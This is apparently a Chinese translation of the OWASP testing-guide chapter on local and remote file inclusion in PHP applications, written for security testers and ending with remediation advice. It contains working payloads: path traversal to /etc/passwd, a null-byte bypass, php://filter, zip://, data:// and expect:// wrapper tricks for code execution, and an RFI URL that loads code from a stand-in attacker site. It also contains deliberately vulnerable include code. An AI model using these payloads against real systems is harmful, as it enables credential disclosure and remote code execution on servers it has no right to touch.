# 测试文件包含

## 概述

文件包含漏洞允许攻击者包含文件，通常利用目标应用程序实现的"动态文件包含"机制。由于使用用户提供的输入而没有适当的验证，因此发生此漏洞。

这可能导致简单地输出文件内容，但也可能导致：

- 在Web服务器上执行代码
- 在客户端（如JavaScript）上执行代码，可能导致其他攻击（如跨站脚本（XSS））
- 拒绝服务（DoS）
- 敏感信息泄露

本地文件包含（LFI）是通过利用应用程序中实现的易受攻击的包含过程来包含服务器上已存在的文件。例如，当页面接收作为本地文件路径的输入时，会发生此漏洞。此输入未正确清理，允许目录遍历字符被注入（请参阅4.5.1[测试目录遍历文件包含](../05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)）。

远程文件包含（RFI）是通过利用应用程序中实现的易受攻击的包含过程来包含来自远程来源的文件。例如，当页面接收作为远程文件URL的输入时，会发生此漏洞。此输入未正确清理，允许外部URL被注入。

在两种情况下，尽管大多数示例指向易受攻击的PHP脚本，但我们应该记住，在JSP、ASP等其他技术中也很常见。

## 测试目标

- 识别文件包含点。
- 评估漏洞的严重程度或潜在影响。

## 如何测试

### 测试本地文件包含

由于当传递给`include`语句的路径未正确清理时会发生LFI，因此在黑盒测试方法中，我们应该查找接受文件名/路径作为参数的函数。

考虑以下示例：

`https://vulnerable_host/preview.php?file=example.html`

这看起来是一个尝试LFI的有希望的地方。如果应用程序不是选择给定`file`参数中的适当页面，而是直接包含输入，则可以包含服务器上的任意文件。

典型的概念验证漏洞利用是尝试加载`passwd`文件：

`https://vulnerable_host/preview.php?file=../../../../etc/passwd`

如果满足上述条件，攻击者将看到类似以下内容包含在响应中：

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

即使存在此类漏洞，在实际场景中其利用可能更复杂。考虑以下代码：

```php
<?php include($_GET['file'].".php"); ?>
```

使用随机文件名进行简单替换将不起作用，因为后缀`.php`被附加到提供的输入。为了绕过它，测试人员可以使用多种技术来获得预期的利用。

#### 空字节注入

`null字符`（也称为`null终止符`或`null字节`）是许多字符集中存在的值为零的控制字符，用作保留字符来标记字符串的结尾。使用后，此特殊字节后的任何字符都将被忽略。通常，使用URL编码字符串`%00`注入此字符会将其附加到请求的路径。在前面的示例中，对`https://vulnerable_host/preview.php?file=../../../../etc/passwd%00`的执行将忽略附加到输入文件名的`.php`扩展名，作为成功利用的结果，向攻击者返回基本用户列表。

#### 路径和点截断

大多数PHP安装的文件名限制为4096字节。如果任何给定文件名长于该长度，PHP只需将其截断，丢弃任何额外字符。利用此行为可以导致PHP引擎通过将其移出4096字节限制来忽略`.php`扩展名。发生这种情况时，不会触发错误；额外字符只是被丢弃，PHP正常继续执行。

此绕过通常与其他逻辑绕过策略组合，如使用Unicode编码对文件路径的一部分进行编码、引入双重编码，或任何其他仍表示所需有效文件名的输入。

#### PHP包装器

本地文件包含漏洞通常被视为仅读取漏洞，攻击者可以使用它来读取托管易受攻击应用程序的服务器上的敏感数据。但是，在某些特定实现中，此漏洞可用于将攻击升级[从LFI升级到远程代码执行](https://www.corben.io/zip-to-rce-lfi/)，这可能完全危害主机。

当攻击者能够将[LFI漏洞与某些PHP包装器](https://www.netsparker.com/blog/web-security/php-stream-wrappers/)组合时，这种增强很常见。

包装器是围绕其他代码添加一些功能的代码。PHP实现了许多[内置包装器](https://www.php.net/manual/en/wrappers.php)与文件系统函数一起使用。一旦在应用程序的测试过程中检测到其使用，尝试滥用它以识别检测到的弱点的真实风险是一种好做法。以下是最常用包装器的列表，尽管它不是详尽的，同时可以注册自定义包装器，如果目标使用，则需要更深入的临时分析。

##### PHP过滤器

用于访问本地文件系统；这是一个大小写不敏感的包装器，提供在打开文件时将过滤器应用于流的功能。此包装器可用于获取文件内容，同时防止服务器执行。例如，允许攻击者读取PHP文件内容以获取敏感信息，如凭据或其他可利用的漏洞。

包装器可以使用`php://filter/convert.base64-encode/resource=FILE`的形式，其中`FILE`是要检索的文件。结果，由于此用法，目标文件的内容将被读取，编码为base64（这是防止服务器端执行的步骤），并返回给User-Agent。

##### PHP ZIP

在PHP 7.2.0中，引入了`zip://`包装器来操作`zip`压缩文件。此包装器期望以下参数结构：`zip:///filename_path#internal_filename`。`filename_path`是恶意ZIP存档的路径，`internal_filename`是放置在正在处理的ZIP文件内的恶意文件的路径。在利用过程中，`#`通常会用其URL编码值`%23`编码。

滥用此包装器可能允许攻击者设计可上传到服务器的恶意ZIP文件，例如作为头像图像或使用目标站点上可用的任何文件上传系统（`php:zip://`包装器不需要ZIP文件具有任何特定扩展名），然后通过LFI漏洞执行。

为了测试此漏洞，可以遵循以下过程来攻击提供的代码示例。

1. 创建要执行的PHP文件，例如将内容保存为`code.php`的`<?php phpinfo(); ?>`。
2. 将其压缩为名为`target.zip`的新ZIP文件。
3. 将`target.zip`文件重命名为`target.jpg`以绕过扩展名验证，并作为头像图像上传到目标网站。
4. 假设`target.jpg`文件本地存储在服务器上的`../avatar/target.jpg`路径，通过使用PHP ZIP包装器通过以下有效载荷利用漏洞：`zip://../avatar/target.jpg%23code`（记住`%23`对应`#`）。

由于示例中`.php`扩展名连接到我们的有效载荷，对`https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code`的请求将导致执行恶意ZIP文件中存在的`code.php`。

##### PHP数据

自PHP 5.2.0以来，此包装器期望以下用法：`data://text/plain;base64,BASE64_STR`，其中`BASE64_STR`是base64编码的要处理的文件内容。请注意，只有在启用`allow_url_include`选项时，此包装器才可用。

为了使用此包装器测试LFI，应将待执行的代码进行base64编码。例如，`<?php phpinfo(); ?>`将编码为`PD9waHAgcGhwaW5mbygpOyA/Pg==`，有效载荷将表示为`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`。

##### PHP Expect

默认情况下未启用此包装器，提供对进程`stdio`、`stdout`和`stderr`的访问。以`expect://command`的形式给出，服务器将使用`BASH`执行提供的命令并返回结果。

### 测试远程文件包含

由于当传递给`include`语句的URL未正确清理时会发生RFI，因此在黑盒测试方法中，我们应该查找接受文件名作为参数的脚本。考虑以下PHP示例：

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

在此示例中，路径是从HTTP请求中提取的，没有进行输入验证（例如，通过检查输入是否与允许列表匹配），因此这段代码容易受到此类攻击。考虑以下URL：

`https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page`

在这种情况下，远程文件将被包含其中，其中包含的任何代码都将被服务器执行。

## 修复

消除文件包含漏洞的最有效解决方案是避免将用户提交的输入传递到任何文件系统/框架API。如果不可能，应用程序可以维护可能由页面包含的文件的允许列表，然后使用标识符（例如索引号）访问所选文件。任何包含无效标识符的请求都应被拒绝，这样就没有机会让恶意用户操纵路径。

查看[文件上传速查表](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)以获取有关此主题的良好安全实践。
